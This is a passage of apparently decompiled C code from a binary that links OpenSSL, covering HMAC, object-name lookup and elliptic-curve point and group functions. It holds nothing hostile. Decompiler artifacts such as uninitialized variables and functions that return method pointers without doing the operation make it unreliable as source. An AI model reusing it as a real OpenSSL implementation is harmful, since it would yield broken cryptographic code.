                        if ((v16 & -8) == 2048) {
                            // 0x488500
                            bool v20; // 0x488420
                            int64_t v21 = v20 ? -1 : 1;
                            int64_t v22 = 256; // 0x488420
                            int64_t v23 = (int64_t)&g18; // 0x488420
                            int64_t v24 = v19;
                            v6 = v19;
                            v7 = v24;
                            v8 = 1;
                            while (v22 != 0) {
                                char v25 = *(char *)v23; // 0x48850f
                                int64_t v26 = v24 + v21; // 0x48850f
                                v22--;
                                v23 += v21;
                                v6 = v19;
                                v7 = v26;
                                v8 = 0;
                                if (*(char *)v24 != v25) {
                                    // break -> 0x488525
                                    break;
                                }
                                v24 = v26;
                                v6 = v19;
                                v7 = v24;
                                v8 = 1;
                            }
                        }
                    }
                }
            }
        }
    }
    // 0x488525
    DH_free(v2);
    // 0x48852d
    CRYPTO_free(v6, v7);
    return v8 & 0xffffffff;
}

// Address range: 0x488a70 - 0x488ad0
int64_t OBJ_NAME_init(int64_t a1) {
    // 0x488a70
    if (g280 != 0) {
        // 0x488a83
        return 1;
    }
    // 0x488a90
    CRYPTO_mem_ctrl(3);
    g280 = lh_new(0x4888b0, 0x488820);
    CRYPTO_mem_ctrl(2);
    return g280 != 0;
}

// Address range: 0x488bd0 - 0x488c7d
int64_t OBJ_NAME_get(int64_t a1, int64_t a2) {
    if (a1 == 0) {
        // 0x488c41
        return 0;
    }
    int64_t v1 = a2; // 0x488bea
    int64_t v2 = g280; // 0x488bea
    if (g280 == 0) {
        // 0x488c60
        if ((int32_t)OBJ_NAME_init(0) == 0) {
            // 0x488c41
            return 0;
        }
        // 0x488c71
        v2 = g280;
        v1 = a2 & 0xffffffff;
    }
    int64_t v3 = lh_retrieve(v2); // 0x488c23
    if (v3 == 0) {
        // 0x488c41
        return 0;
    }
    int64_t v4 = v3; // 0x488c23
    int64_t v5 = 0; // 0x488bd0
    int64_t v6 = v3; // 0x488c30
    while ((int16_t)v1 > -1) {
        // 0x488c32
        v6 = v4;
        if (*(int32_t *)(v4 + 4) == 0) {
            // break -> 0x488c50
            break;
        }
        int64_t v7 = v5 + 1; // 0x488c39
        if ((int32_t)v7 == 11) {
            // 0x488c41
            return 0;
        }
        // 0x488c10
        v4 = lh_retrieve(g280);
        v5 = v7 & 0xffffffff;
        if (v4 == 0) {
            // 0x488c41
            return 0;
        }
        v6 = v3;
    }
    // 0x488c50
    return *(int64_t *)(v6 + 16);
}

// Address range: 0x48f850 - 0x48f87e
int64_t HMAC_CTX_cleanup(int64_t a1) {
    // 0x48f850
    EVP_MD_CTX_cleanup((int64_t *)(a1 + 56));
    EVP_MD_CTX_cleanup((int64_t *)(a1 + 104));
    EVP_MD_CTX_cleanup((int64_t *)(a1 + 8));
    __asm_rep_stosq_memset((char *)a1, 0, 36);
    return 0;
}

// Address range: 0x48f9a0 - 0x48f9c0
int64_t HMAC_CTX_init(int64_t * a1) {
    int64_t v1 = (int64_t)a1;
    EVP_MD_CTX_init(v1 + 56);
    EVP_MD_CTX_init(v1 + 104);
    return EVP_MD_CTX_init(v1 + 8);
}

// Address range: 0x48f9c0 - 0x48fa90
int64_t HMAC_Final(int64_t a1, int64_t * a2, int32_t a3) {
    int64_t v1 = __readfsqword(40); // 0x48f9fd
    int64_t * v2 = (int64_t *)(a1 + 8); // 0x48fa0d
    int64_t v3; // bp-120, 0x48f9c0
    int32_t v4; // bp-124, 0x48f9c0
    int64_t v5 = EVP_DigestFinal_ex(v2, &v3, (int64_t *)&v4); // 0x48fa0d
    int64_t result = 0; // 0x48fa14
    if ((int32_t)v5 != 0) {
        // 0x48fa50
        result = 0;
        if ((int32_t)EVP_MD_CTX_copy_ex(v2, a1 + 104) != 0) {
            int64_t v6 = EVP_DigestUpdate(v2, (int64_t)&v3, (int64_t)v4); // 0x48fa6a
            result = 0;
            if ((int32_t)v6 != 0) {
                // 0x48fa73
                result = (int32_t)EVP_DigestFinal_ex(v2, a2, (int64_t *)(int64_t)a3) != 0;
            }
        }
    }
    // 0x48fa18
    if (v1 == __readfsqword(40)) {
        // 0x48fa28
        return result;
    }
    // 0x48fa8b
    __stack_chk_fail();
    return &g299;
}

// Address range: 0x48fa90 - 0x48fa99
int64_t HMAC_Update(int64_t a1) {
    // 0x48fa90
    int64_t v1; // 0x48fa90
    int64_t v2; // 0x48fa90
    return EVP_DigestUpdate((int64_t *)(a1 + 8), v1, v2);
}

// Address range: 0x48faa0 - 0x48fde0
int64_t HMAC_Init_ex(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int32_t a5, int64_t a6) {
    int64_t v1 = __readfsqword(40); // 0x48fabf
    if ((int32_t)FIPS_mode() == 0) {
        goto lab_0x48faee;
    } else {
        if (a5 == 0) {
            // 0x48fcfb
            if (*(int64_t *)(a1 + 64) != 0) {
                goto lab_0x48fae4;
            } else {
                goto lab_0x48faee;
            }
        } else {
            goto lab_0x48fae4;
        }
    }
  lab_0x48faee:;
    int64_t v2 = a1; // 0x48faf1
    int32_t v3 = 0; // 0x48faf1
    if (a4 != 0) {
        // 0x48faf7
        *(int64_t *)a1 = a4;
        v2 = a4;
        v3 = 1;
    }
    int64_t v4 = a5;
    int64_t result; // 0x48faa0
    int64_t v5; // 0x48faa0
    if (a2 == 0) {
        // 0x48fcc1
        v5 = a1 + 56;
        if (v3 == 0) {
            goto lab_0x48fca6;
        } else {
            goto lab_0x48fbce;
        }
    } else {
        // 0x48fb08
        if ((int32_t)FIPS_mode() == 0) {
            goto lab_0x48fb60;
        } else {
            // 0x48fb11
            if ((*(char *)(v2 + 17) & 4) != 0) {
                goto lab_0x48fb60;
            } else {
                // 0x48fb18
                result = 0;
                if ((*(char *)(a1 + 24) & 8) != 0) {
                    // 0x48fb4b
                    result = 0;
                    if ((*(char *)(a1 + 72) & 8) == 0) {
                        goto lab_0x48fb22;
                    } else {
                        // 0x48fb51
                        result = 0;
                        if ((*(char *)(a1 + 120) & 8) == 0) {
                            goto lab_0x48fb22;
                        } else {
                            goto lab_0x48fb60;
                        }
                    }
                } else {
                    goto lab_0x48fb22;
                }
            }
        }
    }
  lab_0x48fae4:
    // 0x48fae4
    if ((*(char *)(a1 + 73) & 8) == 0) {
        // 0x48fcd3
        ERR_put_error(6, 174, 163, "hmac.c", 81);
        result = 0;
        goto lab_0x48fb22;
    } else {
        goto lab_0x48faee;
    }
  lab_0x48fca6:
    // 0x48fca6
    result = (int32_t)EVP_MD_CTX_copy_ex((int64_t *)(a1 + 8), v5) != 0;
    goto lab_0x48fb22;
  lab_0x48fbce:;
    int64_t v9 = a1 + 128; // 0x48fbd3
    int64_t v10; // bp-200, 0x48faa0
    int64_t v11 = &v10; // 0x48fbdd
    int64_t v12 = a1 + 1; // 0x48fbf7
    *(char *)v11 = *(char *)(a1 + 156) ^ 54;
    int64_t v13 = v11 + 1; // 0x48fc00
    int64_t v14 = v12; // 0x48fc07
    int64_t v15 = v13; // 0x48fc07
    while (v12 != v9) {
        // 0x48fbf0
        v12 = v14 + 1;
        *(char *)v15 = *(char *)(v14 + 156) ^ 54;
        v13 = v15 + 1;
        v14 = v12;
        v15 = v13;
    }
    int64_t v16 = a1 + 56; // 0x48fc09
    int64_t * v17 = (int64_t *)v16; // 0x48fc1d
    result = 0;
    if ((int32_t)EVP_DigestInit_ex(v17, v2, a5, v13, v4) == 0) {
        goto lab_0x48fb22;
    } else {
        int64_t v18 = EVP_DigestUpdate(v17, v11, 0x100000000 * EVP_MD_block_size(v2) / 0x100000000); // 0x48fc3f
        result = 0;
        int64_t v19 = v11; // 0x48fc46
        if ((int32_t)v18 == 0) {
            goto lab_0x48fb22;
        } else {
            int64_t v20 = a1 + 1; // 0x48fc59
            *(char *)v19 = *(char *)(a1 + 156) ^ 92;
            int64_t v21 = v20; // 0x48fc6a
            v19++;
            while (v20 != v9) {
                // 0x48fc50
                v20 = v21 + 1;
                *(char *)v19 = *(char *)(v21 + 156) ^ 92;
                v21 = v20;
                v19++;
            }
            int64_t * v22 = (int64_t *)(a1 + 104); // 0x48fc79
            result = 0;
            if ((int32_t)EVP_DigestInit_ex(v22, v2, a5, v13, v4) == 0) {
                goto lab_0x48fb22;
            } else {
                int64_t v23 = EVP_MD_block_size(v2); // 0x48fc89
                result = 0;
                v5 = v16;
                if ((int32_t)EVP_DigestUpdate(v22, v11, 0x100000000 * v23 / 0x100000000) == 0) {
                    goto lab_0x48fb22;
                } else {
                    goto lab_0x48fca6;
                }
            }
        }
    }
  lab_0x48fb60:;
    int64_t v24 = EVP_MD_block_size(v2); // 0x48fb63
    if ((int32_t)v24 > 128) {
        // 0x48fd1a
        OpenSSLDie("hmac.c", 106, "j <= (int)sizeof(ctx->key)");
        // UNREACHABLE
    }
    int64_t v25 = a3 & 0xffffffff; // 0x48fab2
    int64_t v7; // 0x48faa0
    int64_t v8; // 0x48faa0
    if (v24 < v25) {
        int64_t * v26 = (int64_t *)(a1 + 8); // 0x48fd4f
        result = 0;
        if ((int32_t)EVP_DigestInit_ex(v26, v2, a5, a4, v4) == 0) {
            goto lab_0x48fb22;
        } else {
            // 0x48fd5c
            result = 0;
            if ((int32_t)EVP_DigestUpdate(v26, a2, 0x100000000 * a3 / 0x100000000) == 0) {
                goto lab_0x48fb22;
            } else {
                int64_t v27 = a1 + 156; // 0x48fd72
                int64_t v28 = a1 + 152; // 0x48fd79
                result = 0;
                if ((int32_t)EVP_DigestFinal_ex(v26, (int64_t *)v27, (int64_t *)v28) == 0) {
                    goto lab_0x48fb22;
                } else {
                    // 0x48fd9d
                    v8 = v27;
                    v7 = (int64_t)*(int32_t *)v28;
                    goto lab_0x48fbaf;
                }
            }
        }
    } else {
        uint32_t v29 = (int32_t)a3; // 0x48fb7b
        if (v29 >= 129) {
            // 0x48fdb0
            OpenSSLDie("hmac.c", 119, "len>=0 && len<=(int)sizeof(ctx->key)");
            // UNREACHABLE
        }
        int64_t v30 = a1 + 156; // 0x48fb8a
        memcpy((int64_t *)v30, (int64_t *)a2, v29);
        *(int32_t *)(a1 + 152) = v29;
        v8 = v30;
        v7 = v25;
        goto lab_0x48fbaf;
    }
  lab_0x48fb22:
    // 0x48fb22
    if (v1 != __readfsqword(40)) {
        // 0x48fdcd
        __stack_chk_fail();
        return &g299;
    }
    // 0x48fb39
    return result;
  lab_0x48fbaf:;
    int32_t v6 = v7; // 0x48fbaf
    if (v6 != 128) {
        // 0x48fbb8
        memset((int64_t *)(v7 + v8), 0, 128 - v6);
    }
    goto lab_0x48fbce;
}

// Address range: 0x48fde0 - 0x48fe36
int64_t HMAC_Init(int64_t * a1, char * a2, int64_t a3, int64_t a4, int64_t a5) {
    int64_t v1 = (int64_t)a2;
    int64_t v2 = (int64_t)a1;
    if (a2 == NULL || a4 == 0) {
        // 0x48fded
        int64_t v3; // 0x48fde0
        return HMAC_Init_ex(v2, v1, a3, a4, 0, v3);
    }
    // 0x48fe05
    HMAC_CTX_init(a1);
    return HMAC_Init_ex(v2, v1, a3 & 0xffffffff, a4, 0, (int64_t)&g299);
}

// Address range: 0x48fe40 - 0x48ff60
int64_t HMAC(int64_t a1, int64_t a2, int64_t a3, int64_t * a4, int64_t a5, int64_t * a6, int64_t a7) {
    int64_t v1 = __readfsqword(40); // 0x48fe78
    int64_t v2; // bp-360, 0x48fe40
    HMAC_CTX_init(&v2);
    int64_t v3 = HMAC_Init(&v2, (char *)a2, a3 & 0xffffffff, a1, a5); // 0x48febb
    int64_t result = 0; // 0x48fec2
    if ((int32_t)v3 != 0) {
        int64_t v4 = &v2; // 0x48ff20
        result = 0;
        if ((int32_t)HMAC_Update(v4) != 0) {
            int64_t v5 = a6 == NULL ? (int64_t)&g281 : (int64_t)a6; // 0x48fea6
            result = 0;
            if ((int32_t)HMAC_Final(v4, (int64_t *)v5, (int32_t)a7) != 0) {
                // 0x48ff3e
                HMAC_CTX_cleanup(v4);
                result = v5;
            }
        }
    }
    // 0x48fec6
    if (v1 == __readfsqword(40)) {
        // 0x48fedc
        return result;
    }
    // 0x48ff4b
    __stack_chk_fail();
    return &g299;
}

// Address range: 0x497ec0 - 0x497ec4
int64_t EC_GROUP_method_of(int64_t result) {
    // 0x497ec0
    return result;
}

// Address range: 0x497ed0 - 0x497ed4
int64_t EC_METHOD_get_field_type(int64_t a1) {
    // 0x497ed0
    return (int64_t)*(int32_t *)(a1 + 4);
}

// Address range: 0x497ee0 - 0x497ee5
int64_t EC_GROUP_get0_generator(int64_t a1) {
    // 0x497ee0
    return *(int64_t *)(a1 + 8);
}

// Address range: 0x497ef0 - 0x497ef4
int64_t EC_GROUP_set_curve_name(int64_t a1, int64_t a2) {
    // 0x497ef0
    *(int32_t *)(a1 + 64) = (int32_t)a2;
    int64_t result; // 0x497ef0
    return result;
}

// Address range: 0x497f70 - 0x497f9d
int64_t EC_EX_DATA_get_data(int64_t a1, int64_t a2, int64_t a3, int64_t a4) {
    // 0x497f70
    if (a1 == 0) {
        // 0x497f92
        return 0;
    }
    // 0x497f70
    if (*(int64_t *)(a1 + 16) == a2) {
        // 0x497f7e
        if (*(int64_t *)(a1 + 24) == a3) {
            // 0x497f84
            if (*(int64_t *)(a1 + 32) == a4) {
                // 0x497f98
                return *(int64_t *)(a1 + 8);
            }
        }
    }
    int64_t v1 = *(int64_t *)a1; // 0x497f8a
    while (v1 != 0) {
        int64_t v2 = v1;
        if (*(int64_t *)(v2 + 16) == a2) {
            // 0x497f7e
            if (*(int64_t *)(v2 + 24) == a3) {
                // 0x497f84
                if (*(int64_t *)(v2 + 32) == a4) {
                    // 0x497f98
                    return *(int64_t *)(v2 + 8);
                }
            }
        }
        // 0x497f8a
        v1 = *(int64_t *)v2;
    }
    // 0x497f92
    return 0;
}

// Address range: 0x498030 - 0x498055
int64_t EC_POINTs_mul(int64_t a1, int64_t a2) {
    int64_t result = *(int64_t *)(a1 + 232); // 0x498038
    if (result == 0) {
        // 0x498050
        int64_t v1; // 0x498030
        int64_t v2; // 0x498030
        int64_t v3; // 0x498030
        int64_t v4; // 0x498030
        int64_t v5; // 0x498030
        return ec_wNAF_mul(a1, v3, v4, v5, v2, v1, (int64_t)&g299);
    }
    // 0x498044
    return result;
}

// Address range: 0x498060 - 0x498098
int64_t EC_POINT_mul(int64_t a1, int64_t a2, int32_t a3, int64_t a4, int64_t a5, int64_t a6) {
    // 0x498060
    return EC_POINTs_mul(a1, a6);
}

// Address range: 0x4980a0 - 0x49812b
int64_t EC_POINTs_make_affine(int64_t a1, uint64_t a2, int64_t a3, int64_t a4, int64_t a5) {
    int64_t result = *(int64_t *)(a1 + 224); // 0x4980a7
    if (result == 0) {
        // 0x498108
        ERR_put_error(16, 136, 66, "ec_lib.c", 1029);
        // 0x4980da
        return 0;
    }
    // 0x4980b3
    if (a2 == 0) {
        // 0x4980da
        return result;
    }
    int64_t v1 = 0; // 0x4980c1
    if (a1 != a3) {
      lab_0x4980e0:
        // 0x4980e0
        ERR_put_error(16, 136, 101, "ec_lib.c", 1036);
        // 0x4980da
        return 0;
    }
    v1++;
    while (v1 < a2) {
        // 0x4980c8
        if (*(int64_t *)*(int64_t *)(8 * v1 + a1) != a1) {
            goto lab_0x4980e0;
        }
        v1++;
    }
    // 0x4980da
    return result;
}

// Address range: 0x4981b0 - 0x498223
int64_t EC_POINT_cmp(int64_t a1, int64_t a2, int64_t a3) {
    int64_t v1 = *(int64_t *)(a1 + 208); // 0x4981b7
    if (v1 == 0) {
        // 0x498200
        ERR_put_error(16, 113, 66, "ec_lib.c", 995);
        // 0x4981e9
        return 0;
    }
    int64_t result = v1; // 0x4981c6
    if (a1 != a2 || a1 != a3) {
        // 0x4981c8
        ERR_put_error(16, 113, 101, "ec_lib.c", 1000);
        result = 0;
    }
    // 0x4981e9
    return result;
}

// Address range: 0x498230 - 0x4982a3
int64_t EC_POINT_is_on_curve(int64_t a1, int64_t a2) {
    int64_t v1 = *(int64_t *)(a1 + 200); // 0x498237
    if (v1 == 0) {
        // 0x498280
        ERR_put_error(16, 119, 66, "ec_lib.c", 979);
        // 0x498269
        return 0;
    }
    int64_t result = v1; // 0x498246
    if (a1 != a2) {
        // 0x498248
        ERR_put_error(16, 119, 101, "ec_lib.c", 984);
        result = 0;
    }
    // 0x498269
    return result;
}

// Address range: 0x4982b0 - 0x498323
int64_t EC_POINT_is_at_infinity(int64_t a1, int64_t a2) {
    int64_t v1 = *(int64_t *)(a1 + 192); // 0x4982b7
    if (v1 == 0) {
        // 0x498300
        ERR_put_error(16, 118, 66, "ec_lib.c", 963);
        // 0x4982e9
        return 0;
    }
    int64_t result = v1; // 0x4982c6
    if (a1 != a2) {
        // 0x4982c8
        ERR_put_error(16, 118, 101, "ec_lib.c", 968);
        result = 0;
    }
    // 0x4982e9
    return result;
}

// Address range: 0x498330 - 0x4983a3
int64_t EC_POINT_invert(int64_t a1, int64_t a2) {
    // 0x498330
    if (*(int64_t *)(a1 + 176) == 0) {
        // 0x498380
        ERR_put_error(16, 210, 66, "ec_lib.c", 947);
        // 0x498367
        return 0;
    }
    if (a1 == a2) {
        // 0x498370
        return *(int64_t *)(a1 + 184);
    }
    // 0x498346
    ERR_put_error(16, 210, 101, "ec_lib.c", 952);
    // 0x498367
    return 0;
}

// Address range: 0x4983b0 - 0x498423
int64_t EC_POINT_dbl(int64_t a1, int64_t a2, int64_t a3) {
    int64_t v1 = *(int64_t *)(a1 + 176); // 0x4983b7
    if (v1 == 0) {
        // 0x498400
        ERR_put_error(16, 115, 66, "ec_lib.c", 931);
        // 0x4983e9
        return 0;
    }
    int64_t result = v1; // 0x4983c6
    if (a1 != a2 || a1 != a3) {
        // 0x4983c8
        ERR_put_error(16, 115, 101, "ec_lib.c", 936);
        result = 0;
    }
    // 0x4983e9
    return result;
}

// Address range: 0x498430 - 0x4984a3
int64_t EC_POINT_add(int64_t a1, int64_t a2, int64_t a3, int64_t a4) {
    int64_t v1 = *(int64_t *)(a1 + 168); // 0x498437
    if (v1 == 0) {
        // 0x498480
        ERR_put_error(16, 112, 66, "ec_lib.c", 915);
        // 0x498469
        return 0;
    }
    int64_t result = v1; // 0x498446
    if (a1 != a2 || a1 == a3 != (a1 == a4)) {
        // 0x498448
        ERR_put_error(16, 112, 101, "ec_lib.c", 920);
        result = 0;
    }
    // 0x498469
    return result;
}

// Address range: 0x4984b0 - 0x498523
int64_t EC_POINT_get_affine_coordinates_GFp(int64_t a1, int64_t a2) {
    int64_t v1 = *(int64_t *)(a1 + 136); // 0x4984b7
    if (v1 == 0) {
        // 0x498500
        ERR_put_error(16, 116, 66, "ec_lib.c", 882);
        // 0x4984e9
        return 0;
    }
    int64_t result = v1; // 0x4984c6
    if (a1 != a2) {
        // 0x4984c8
        ERR_put_error(16, 116, 101, "ec_lib.c", 887);
        result = 0;
    }
    // 0x4984e9
    return result;
}

// Address range: 0x498530 - 0x4985a3
int64_t EC_POINT_set_affine_coordinates_GFp(int64_t a1, int64_t a2) {
    int64_t v1 = *(int64_t *)(a1 + 128); // 0x498537
    if (v1 == 0) {
        // 0x498580
        ERR_put_error(16, 124, 66, "ec_lib.c", 848);
        // 0x498569
        return 0;
    }
    int64_t result = v1; // 0x498546
    if (a1 != a2) {
        // 0x498548
        ERR_put_error(16, 124, 101, "ec_lib.c", 853);
        result = 0;
    }
    // 0x498569
    return result;
}

// Address range: 0x4986b0 - 0x498723
int64_t EC_POINT_set_to_infinity(int64_t a1, int64_t a2) {
    int64_t v1 = *(int64_t *)(a1 + 104); // 0x4986b7
    if (v1 == 0) {
        // 0x498700
        ERR_put_error(16, 127, 66, "ec_lib.c", 797);
        // 0x4986e6
        return 0;
    }
    int64_t result = v1; // 0x4986c3
    if (a1 != a2) {
        // 0x4986c5
        ERR_put_error(16, 127, 101, "ec_lib.c", 802);
        result = 0;
    }
    // 0x4986e6
    return result;
}

// Address range: 0x498730 - 0x4987a2
int64_t EC_POINT_copy(int64_t a1, int64_t a2) {
    // 0x498730
    if (*(int64_t *)(a1 + 96) == 0) {
        // 0x498780
        ERR_put_error(16, 114, 66, "ec_lib.c", 754);
        // 0x498768
        return 0;
    }
    int64_t result = 1; // 0x498743
    if (a1 != a2) {
        // 0x498745
        ERR_put_error(16, 114, 101, "ec_lib.c", 759);
        result = 0;
    }
    // 0x498768
    return result;
}

// Address range: 0x4988a0 - 0x4988e8
int64_t EC_GROUP_set_curve_GFp(int64_t a1) {
    int64_t result = *(int64_t *)(a1 + 40); // 0x4988a7
    if (result != 0) {
        // 0x4988b0
        return result;
    }
    // 0x4988c0
    ERR_put_error(16, 109, 66, "ec_lib.c", 411);
    return 0;
}

// Address range: 0x4988f0 - 0x498932
int64_t EC_POINT_clear_free(int64_t a1) {
    // 0x4988f0
    if (a1 == 0) {
        // 0x498930
        int64_t result; // 0x4988f0
        return result;
    }
    // 0x4988f9
    OPENSSL_cleanse(a1, 88);
    return CRYPTO_free(a1, 88);
}

// Address range: 0x498940 - 0x498962
int64_t EC_POINT_free(int64_t a1) {
    // 0x498940
    if (a1 == 0) {
        // 0x498960
        int64_t result; // 0x498940
        return result;
    }
    // 0x498949
    int64_t v1; // 0x498940
    return CRYPTO_free(a1, v1);
}

// Address range: 0x498970 - 0x4989af
int64_t EC_EX_DATA_clear_free_all_data(int64_t a1) {
    // 0x498970
    if (a1 == 0) {
        // 0x4989aa
        int64_t result; // 0x498970
        return result;
    }
    int64_t v1 = *(int64_t *)a1; // 0x498988
    int64_t v2; // 0x498970
    int64_t result2 = CRYPTO_free(a1, v2); // 0x498995
    while (v1 != 0) {
        int64_t v3 = v1;
        v1 = *(int64_t *)v3;
        result2 = CRYPTO_free(v3, v2);
    }
    // 0x4989a2
    *(int64_t *)a1 = 0;
    // 0x4989aa
    return result2;
}

// Address range: 0x4989b0 - 0x4989ef
int64_t EC_EX_DATA_free_all_data(int64_t a1) {
    // 0x4989b0
    if (a1 == 0) {
        // 0x4989ea
        int64_t result; // 0x4989b0
        return result;
    }
    int64_t v1 = *(int64_t *)a1; // 0x4989c8
    int64_t v2; // 0x4989b0
    int64_t result2 = CRYPTO_free(a1, v2); // 0x4989d5
    while (v1 != 0) {
        int64_t v3 = v1;
        v1 = *(int64_t *)v3;
        result2 = CRYPTO_free(v3, v2);
    }
    // 0x4989e2
    *(int64_t *)a1 = 0;
    // 0x4989ea
    return result2;
}

// Address range: 0x498ab0 - 0x498b8b
int64_t EC_POINT_new(int64_t a1) {
    // 0x498ab0
    if (a1 == 0) {
        // 0x498b63
        ERR_put_error(16, 121, 67, "ec_lib.c", 699);
        // 0x498afb
        return 0;
    }
    // 0x498ac2
    if (*(int64_t *)(a1 + 72) == 0) {
        // 0x498b18
        ERR_put_error(16, 121, 66, "ec_lib.c", 704);
        // 0x498afb
        return 0;
    }
    // 0x498acc
    int64_t v1; // 0x498ab0
    int64_t v2; // 0x498ab0
    int64_t v3 = CRYPTO_malloc(88, "ec_lib.c", 708, v2, v1); // 0x498add
    int64_t result; // 0x498ab0
    if (v3 == 0) {
        // 0x498b40
        ERR_put_error(16, 121, 65, "ec_lib.c", 711);
        result = 0;
    } else {
        // 0x498aea
        *(int64_t *)v3 = 88;
        result = v3;
    }
    // 0x498afb
    return result;
}

// Address range: 0x498b90 - 0x498beb
int64_t EC_POINT_dup(int64_t a1, int64_t a2) {
    // 0x498b90
    if (a1 == 0) {
        // 0x498ba8
        return 0;
    }
    int64_t v1 = EC_POINT_new(a2); // 0x498bc3
    if (v1 == 0) {
        // 0x498ba8
        return 0;
    }
    int64_t v2 = EC_POINT_copy(v1, a1); // 0x498bd6
    int64_t result = v1; // 0x498bdd
    if ((int32_t)v2 == 0) {
        // 0x498bdf
        EC_POINT_free(v1);
        result = 0;
    }
    // 0x498ba8
    return result;
}

// Address range: 0x498bf0 - 0x498cb9
int64_t EC_EX_DATA_set_data(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5) {
    // 0x498bf0
    if (a1 == 0) {
        // 0x498ca5
        return 0;
    }
    // 0x498bf0
    int64_t result; // 0x498bf0
    if (*(int64_t *)(a1 + 16) == a3) {
        // 0x498c2e
        if (*(int64_t *)(a1 + 24) == a4) {
            // 0x498c34
            if (*(int64_t *)(a1 + 32) == a5) {
                // 0x498c3a
                ERR_put_error(16, 211, 108, "ec_lib.c", 561);
                result = 0;
                return result;
            }
        }
    }
    int64_t v1 = *(int64_t *)a1; // 0x498c20
    while (v1 != 0) {
        int64_t v2 = v1;
        if (*(int64_t *)(v2 + 16) == a3) {
            // 0x498c2e
            if (*(int64_t *)(v2 + 24) == a4) {
                // 0x498c34
                if (*(int64_t *)(v2 + 32) == a5) {
                    // 0x498c3a
                    ERR_put_error(16, 211, 108, "ec_lib.c", 561);
                    result = 0;
                    return result;
                }
            }
        }
        // 0x498c20
        v1 = *(int64_t *)v2;
    }
    // 0x498c60
    if (a2 == 0) {
        // 0x498ca5
        return 1;
    }
    int64_t v3 = CRYPTO_malloc(40, "ec_lib.c", 570, a4, a5); // 0x498c7b
    result = 0;
    if (v3 != 0) {
        // 0x498c85
        *(int64_t *)(v3 + 8) = a2;
        *(int64_t *)(v3 + 16) = a3;
        *(int64_t *)(v3 + 24) = a4;
        *(int64_t *)(v3 + 32) = a5;
        *(int64_t *)v3 = 40;
        *(int64_t *)a1 = v3;
        result = 1;
    }
  lab_0x498ca5:
    // 0x498ca5
    return result;
}

// Address range: 0x498cc0 - 0x498d5c
int64_t EC_GROUP_set_seed(int64_t a1, int64_t a2, int64_t a3) {
    int64_t * v1 = (int64_t *)(a1 + 80); // 0x498cd6
    int64_t v2 = *v1; // 0x498cd6
    if (v2 != 0) {
        // 0x498ce5
        CRYPTO_free(v2, a2);
        *v1 = 0;
        *(int64_t *)(a1 + 88) = 0;
    }
    // 0x498cfa
    if (a2 == 0 || a3 == 0) {
        // 0x498d04
        return 1;
    }
    // 0x498d25
    int64_t v3; // 0x498cc0
    int64_t v4; // 0x498cc0
    int64_t v5 = CRYPTO_malloc(a3 & 0xffffffff, "ec_lib.c", 386, v4, v3); // 0x498d33
    *v1 = v5;
    int64_t result = 0; // 0x498d3f
    if (v5 != 0) {
        // 0x498d41
        memcpy((int64_t *)v5, (int64_t *)a2, (int32_t)a3);
        *(int64_t *)(a1 + 88) = a3;
        result = a3;
    }
    // 0x498d04
    return result;
}

// Address range: 0x4992b0 - 0x4993a6
int64_t EC_GROUP_set_generator(int64_t a1, int64_t a2, int64_t a3, int64_t a4) {
    if (a2 == 0) {
        // 0x499380
        ERR_put_error(16, 111, 67, "ec_lib.c", 288);
        // 0x499317
        return 0;
    }
    int64_t * v1 = (int64_t *)(a1 + 8); // 0x4992d5
    int64_t v2 = *v1; // 0x4992d5
    int64_t v3 = v2; // 0x4992dc
    if (v2 == 0) {
        // 0x499330
        v3 = EC_POINT_new(a1);
        *v1 = v3;
        if (v3 == 0) {
            // 0x499317
            return 0;
        }
    }
    // 0x4992de
    if ((int32_t)EC_POINT_copy(v3, a2) == 0) {
        // 0x499317
        return 0;
    }
    int64_t v4 = a1 + 16;
    if (a3 == 0) {
        // 0x499358
        BN_set_word(v4, 0);
    } else {
        // 0x4992ec
        if (BN_copy(v4, a3) == 0) {
            // 0x499317
            return 0;
        }
    }
    int64_t v5 = a1 + 40;
    int64_t result; // 0x4992b0
    if (a4 == 0) {
        // 0x499368
        BN_set_word(v5, 0);
        result = 1;
    } else {
        // 0x499302
        result = BN_copy(v5, a4) != 0;
    }
    // 0x499317
    return result;
}

// Address range: 0x4993b0 - 0x49943a
int64_t EC_GROUP_clear_free(int64_t a1) {
    // 0x4993b0
    if (a1 == 0) {
        // 0x499438
        int64_t result; // 0x4993b0
        return result;
    }
    // 0x4993b9
    EC_EX_DATA_clear_free_all_data(a1 + 96);
    int64_t v1 = *(int64_t *)(a1 + 8); // 0x4993d3
    if (v1 != 0) {
        // 0x4993dc
        EC_POINT_clear_free(v1);
    }
    // 0x4993e1
    BN_clear_free(a1 + 16);
    BN_clear_free(a1 + 40);
    int64_t * v2 = (int64_t *)(a1 + 80); // 0x4993f3
    int64_t v3 = *v2; // 0x4993f3
    if (v3 != 0) {
        int64_t v4 = *(int64_t *)(a1 + 88); // 0x4993fc
        OPENSSL_cleanse(v3, v4);
        CRYPTO_free(*v2, v4);
    }
    // 0x49940e
    OPENSSL_cleanse(a1, 232);
    return CRYPTO_free(a1, 232);
}

// Address range: 0x499440 - 0x4994a2
int64_t EC_GROUP_free(int64_t a1) {
    // 0x499440
    if (a1 == 0) {
        // 0x4994a0
        int64_t result; // 0x499440
        return result;
    }
    // 0x499449
    EC_EX_DATA_free_all_data(a1 + 96);
    int64_t v1 = *(int64_t *)(a1 + 8); // 0x499460
    if (v1 != 0) {
        // 0x499469
        EC_POINT_free(v1);
    }
    // 0x49946e
    BN_free(a1 + 16);
    BN_free(a1 + 40);
    int64_t v2 = *(int64_t *)(a1 + 80); // 0x499480
    int64_t v3; // 0x499440
    if (v2 != 0) {
        // 0x499489
        CRYPTO_free(v2, v3);
    }
    // 0x49948e
    return CRYPTO_free(a1, v3);
}

// Address range: 0x4994b0 - 0x4995d3
int64_t EC_GROUP_new(int64_t a1) {
    // 0x4994b0
    if (a1 == 0) {
        // 0x4995ab
        ERR_put_error(16, 108, 108, "ec_lib.c", 82);
        // 0x499543
        return 0;
    }
    // 0x4994c2
    if (*(int64_t *)(a1 + 8) == 0) {
        // 0x499560
        ERR_put_error(16, 108, 66, "ec_lib.c", 87);
        // 0x499543
        return 0;
    }
    // 0x4994cd
    int64_t v1; // 0x4994b0
    int64_t v2; // 0x4994b0
    int64_t v3 = CRYPTO_malloc(232, "ec_lib.c", 91, v2, v1); // 0x4994de
    if (v3 == 0) {
        // 0x499588
        ERR_put_error(16, 108, 65, "ec_lib.c", 94);
        // 0x499543
        return 0;
    }
    // 0x4994ef
    *(int64_t *)v3 = a1;
